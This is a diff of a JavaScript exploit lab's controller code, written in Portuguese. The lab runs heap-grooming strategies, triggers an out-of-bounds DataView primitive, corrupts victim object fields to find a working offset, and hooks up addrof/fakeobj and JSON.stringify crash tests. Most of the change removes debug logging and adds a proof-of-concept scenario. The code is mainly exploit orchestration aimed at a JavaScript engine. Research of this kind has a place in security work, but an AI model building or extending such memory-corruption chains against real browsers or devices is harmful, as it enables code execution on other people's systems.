@@ -63,80 +63,50 @@ const App = {
 
             if (strat.oob_first) {
                 appLog(`[${runId}]    Estratégia '${strat.name}': OOB será ativado primeiro.`, "info", FNAME_STRAT);
-                appLog(`[${runId}]    Antes de Core.triggerOOB_primitive (oob_first)`, "debug", FNAME_STRAT);
                 await Core.triggerOOB_primitive();
-                appLog(`[${runId}]    Depois de Core.triggerOOB_primitive (oob_first), oob_dataview_real: ${!!Core.oob_dataview_real}`, "debug", FNAME_STRAT);
                 if (!Core.oob_dataview_real) { appLog(`[${runId}] Falha ao ativar OOB (OOB primeiro), pulando estratégia.`, "error", FNAME_STRAT); await PAUSE_LAB(500); continue; }
-
-                appLog(`[${runId}]    Antes de Groomer.groomHeapForSameSize (oob_first)`, "debug", FNAME_STRAT);
                 await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, currentOOBAllocationSize, intermediate_allocs + strat.inter_adj, false);
-                appLog(`[${runId}]    Depois de Groomer.groomHeapForSameSize (oob_first)`, "debug", FNAME_STRAT);
-
-                appLog(`[${runId}]    Antes de Groomer.prepareVictim (oob_first)`, "debug", FNAME_STRAT);
                 victimPrepared = await Groomer.prepareVictim(currentOOBAllocationSize);
-                appLog(`[${runId}]    Depois de Groomer.prepareVictim (oob_first), victimPrepared: ${victimPrepared}`, "debug", FNAME_STRAT);
             } else { // victim_first
                 appLog(`[${runId}]    Estratégia '${strat.name}': Vítima será preparada primeiro.`, "info", FNAME_STRAT);
-                appLog(`[${runId}]    Antes de Groomer.groomHeapForSameSize (victim_first)`, "debug", FNAME_STRAT);
                 await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, currentOOBAllocationSize, intermediate_allocs + strat.inter_adj, true);
-                appLog(`[${runId}]    Depois de Groomer.groomHeapForSameSize (victim_first)`, "debug", FNAME_STRAT);
-
-                appLog(`[${runId}]    Antes de Groomer.prepareVictim (victim_first)`, "debug", FNAME_STRAT);
                 victimPrepared = await Groomer.prepareVictim(currentOOBAllocationSize);
-                appLog(`[${runId}]    Depois de Groomer.prepareVictim (victim_first), victimPrepared: ${victimPrepared}`, "debug", FNAME_STRAT);
-
                 if (victimPrepared) {
                     appLog(`[${runId}]    Estratégia '${strat.name}': Vítima preparada, ativando OOB agora.`, "info", FNAME_STRAT);
-                    appLog(`[${runId}]    Antes de Core.triggerOOB_primitive (victim_first, OOB after victim)`, "debug", FNAME_STRAT);
                     await Core.triggerOOB_primitive();
-                    appLog(`[${runId}]    Depois de Core.triggerOOB_primitive (victim_first, OOB after victim), oob_dataview_real: ${!!Core.oob_dataview_real}`, "debug", FNAME_STRAT);
                     if (!Core.oob_dataview_real) { appLog(`[${runId}] Falha ao ativar OOB (após vítima), pulando estratégia.`, "error", FNAME_STRAT); await PAUSE_LAB(500); continue; }
                 }
             }
 
-            appLog(`[${runId}]    Estratégia '${strat.name}': Status Pós-Preparação -> victimPrepared: ${victimPrepared}, Groomer.victim_object existe: ${!!Groomer.victim_object}`, "info", FNAME_STRAT);
-            if (Groomer.victim_object && victimPrepared) {
-                appLog(`[${runId}]       Groomer.victim_object.length: ${Groomer.victim_object.length}`, "info", FNAME_STRAT);
-            }
+            appLog(`[${runId}]    Estratégia '${strat.name}': Status Pós-Preparação -> victimPrepared: ${victimPrepared}, Groomer.victim_object: ${!!Groomer.victim_object}`, "info", FNAME_STRAT);
 
-            if (!victimPrepared) {
-                appLog(`[${runId}]    Estratégia '${strat.name}': Falha ao preparar vítima (victimPrepared é false). Pulando corrupção.`, "error", FNAME_STRAT);
-                await PAUSE_LAB(500); continue;
-            }
-            if (!Groomer.victim_object) {
-                 appLog(`[${runId}]    Estratégia '${strat.name}': ERRO CRÍTICO FINAL CHECK: Groomer.victim_object é null ANTES de chamar findAndCorrupt. Pulando corrupção.`, "error", FNAME_STRAT);
-                 await PAUSE_LAB(500); continue;
-            }
-            if (!Core.oob_dataview_real) {
-                appLog(`[${runId}]    Estratégia '${strat.name}': ERRO CRÍTICO: Primitiva OOB não está ativa ANTES de chamar findAndCorrupt. Pulando corrupção.`, "error", FNAME_STRAT);
+            if (!victimPrepared || !Groomer.victim_object || !Core.oob_dataview_real) {
+                appLog(`[${runId}]    Estratégia '${strat.name}': Falha na preparação (vítima/OOB). Pulando corrupção.`, "error", FNAME_STRAT);
                 await PAUSE_LAB(500); continue;
             }
 
             appLog(`[${runId}]    Estratégia '${strat.name}': Vítima OK, OOB OK. Tentando corrupção...`, "info", FNAME_STRAT);
-            appLog(`[${runId}]    Antes de Corruptor.findAndCorruptVictimFields_Iterative`, "debug", FNAME_STRAT);
             await Corruptor.findAndCorruptVictimFields_Iterative();
-            appLog(`[${runId}]    Depois de Corruptor.findAndCorruptVictimFields_Iterative. Gap encontrado: ${Corruptor.getLastSuccessfulGap()}`, "debug", FNAME_STRAT);
 
             if (Corruptor.getLastSuccessfulGap() !== null) {
-                appLog(`[${runId}] GAP de sucesso encontrado (${Corruptor.getLastSuccessfulGap()}) pela estratégia '${strat.name}'! Interrompendo mais estratégias.`, "good", FNAME_STRAT);
+                appLog(`[${runId}] GAP de sucesso encontrado (${Corruptor.getLastSuccessfulGap()}) pela estratégia '${strat.name}'! Interrompendo.`, "good", FNAME_STRAT);
                 App.exploitSuccessfulThisSession = true;
                 break;
             }
-            appLog(`[${runId}]    Estratégia ${strat.name} concluída, nenhum GAP encontrado ainda. Antes de PAUSE_LAB(2000)`, "info", FNAME_STRAT);
+            appLog(`[${runId}]    Estratégia ${strat.name} concluída. Pausando.`, "info", FNAME_STRAT);
             await PAUSE_LAB(2000);
-            appLog(`[${runId}]    Depois de PAUSE_LAB(2000)`, "debug", FNAME_STRAT);
             appLog(`[${runId}] Loop Estratégia: ${strat.name} - Fim`, "info", FNAME_STRAT);
         }
 
-        appLog(`[${runId}] --- ${FNAME_STRAT} Concluído (Após loop de estratégias) ---`, 'test', FNAME_STRAT);
+        appLog(`[${runId}] --- ${FNAME_STRAT} Concluído ---`, 'test', FNAME_STRAT);
         if (Corruptor.getLastSuccessfulGap() !== null) {
-            appLog(`[${runId}] GAP de SUCESSO encontrado e armazenado: ${Corruptor.getLastSuccessfulGap()}.`, "vuln", FNAME_STRAT);
+            appLog(`[${runId}] GAP DE SUCESSO GLOBAL: ${Corruptor.getLastSuccessfulGap()}.`, "vuln", FNAME_STRAT);
             App.exploitSuccessfulThisSession = true;
             const addrofGapEl = document.getElementById('addrofGap');
             if (addrofGapEl) addrofGapEl.value = Corruptor.getLastSuccessfulGap();
-            if (btnRunStrategies) btnRunStrategies.textContent = "GAP Encontrado! Recarregue para tentar de novo.";
+            if (btnRunStrategies) btnRunStrategies.textContent = "GAP Encontrado! Recarregue.";
         } else {
-            appLog(`[${runId}] Nenhuma estratégia resultou em GAP de sucesso nesta rodada.`, "error", FNAME_STRAT);
+            appLog(`[${runId}] Nenhuma estratégia resultou em GAP de sucesso.`, "error", FNAME_STRAT);
             if (btnRunStrategies) btnRunStrategies.disabled = false;
         }
         App.isCurrentlyRunningStrategies = false;
@@ -199,32 +169,39 @@ const App = {
         document.getElementById('btnTestAddrofConceptual')?.addEventListener('click', PostExploit.test_addrof_conceptual);
         document.getElementById('btnTestFakeobjConceptual')?.addEventListener('click', PostExploit.test_fakeobj_conceptual);
         
-        // MODIFICADO: Listener para o botão de teste JSON
         document.getElementById('btnTestJsonStringify')?.addEventListener('click', async () => {
             const scenarioSelect = document.getElementById('jsonScenarioSelect');
             const selectedScenario = scenarioSelect ? scenarioSelect.value : 'fallback';
             appLog(`Iniciando Teste JSON com cenário: ${selectedScenario}`, 'tool', 'App.JsonTestSetup');
 
-            let objectToPass = {
-                description: `Teste com cenário ${selectedScenario}`,
-                default_data: "algum_valor_contextual_app"
-            };
+            let objectToPass;
 
-            // Se o cenário 3 for escolhido, tentamos passar o objeto vítima
-            if (selectedScenario === 'scenario3') {
+            if (selectedScenario === 'scenario0_poc_v21') {
+                appLog("Cenário 0 (PoC v2.1): Usando objeto de teste simples.", "tool", "App.JsonTestSetup");
+                objectToPass = {
+                    a: 1, // Similar ao testObject do PoC Isolado
+                    b: 'test_data_from_app_for_poc_v21_scenario',
+                    c: { nested_in_app: true }
+                };
+            } else if (selectedScenario === 'scenario3') {
+                appLog("Cenário 3: Preparando para passar objeto vítima (se existir)...", "tool", "App.JsonTestSetup");
+                objectToPass = {
+                    description: `Teste com cenário ${selectedScenario}`,
+                    default_data: "valor_contextual_app_s3"
+                };
                 if (Groomer.victim_object) {
-                    appLog("Cenário 3: Incluindo OBJETO VÍTIMA no teste JSON.", "tool", "App.JsonTestSetup");
+                    appLog("Cenário 3: Incluindo OBJETO VÍTIMA no teste JSON.", "good", "App.JsonTestSetup");
                     objectToPass.controlled_victim = Groomer.victim_object;
-                    // Exemplo de como adicionar mais dados relevantes ao objeto serializado:
-                    // objectToPass.oob_buffer_ref_example = Core.oob_array_buffer_real; // Cuidado com referências diretas a ArrayBuffers grandes
                 } else {
-                    appLog("Cenário 3: Objeto vítima não preparado! Testando com dados padrão.", "warn", "App.JsonTestSetup");
+                    appLog("Cenário 3: Objeto vítima não preparado! Testando com dados padrão para S3.", "warn", "App.JsonTestSetup");
                 }
+            } else {
+                // Objeto padrão para outros cenários
+                objectToPass = {
+                    description: `Teste com cenário ${selectedScenario}`,
+                    default_data: `valor_contextual_app_cenario_${selectedScenario}`
+                };
             }
-            // Futuramente, você pode adicionar inputs no HTML para pegar `customParams` e passá-los aqui:
-            // const customParams = { keyLength: ..., valueLength: ... };
-            // await JsonExploitTest.attemptJsonStringifyCrash(objectToPass, selectedScenario, customParams);
-
             await JsonExploitTest.attemptJsonStringifyCrash(objectToPass, selectedScenario);
         });
 
@@ -247,7 +224,7 @@ const App = {
             btnRunStrategies.disabled = false;
             btnRunStrategies.textContent = "Executar Todas Estratégias de Grooming & Busca de GAP";
         }
-        appLog("Laboratório Modularizado (v2.8.7 - Seleção de Cenário JSON) pronto.", "good", "App.Init");
+        appLog("Laboratório Modularizado (v2.8.8 - Cenário PoC Isolado) pronto.", "good", "App.Init");
         const addrofGapEl = document.getElementById('addrofGap');
         if (addrofGapEl) addrofGapEl.value = "";
         uiInitialized = true;
